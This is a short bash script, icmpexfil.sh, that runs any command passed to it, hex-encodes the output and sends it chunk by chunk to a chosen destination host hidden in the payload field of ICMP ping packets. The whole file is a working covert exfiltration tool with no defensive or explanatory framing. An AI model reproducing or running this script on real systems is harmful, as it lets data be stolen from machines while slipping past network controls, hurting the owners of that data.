#!/usr/bin/env bash

echo "${@:2}"
if [[ -z "$1" ]] || [[ -z "$2" ]];
then
        echo "usage : icmpexfil.sh <destination> <command>"
        exit
fi

DEST=$1 
CMD=${@:2}
OUTPUT=$($CMD | xxd -p -c 16)

ORG=$IFS

IFS=$(echo -en "\n\b")

for ROW in ${OUTPUT[@]}
do
        if [[ ${#ROW} = 32 ]]; then
                PAYLOAD=$ROW
        else 
                PAD=$(printf "%0$(expr 32 - ${#ROW})d" 0)
                PAYLOAD=$ROW$PAD
        fi
        ping -c 1 -p $PAYLOAD $DEST

done
IFS=$ORG
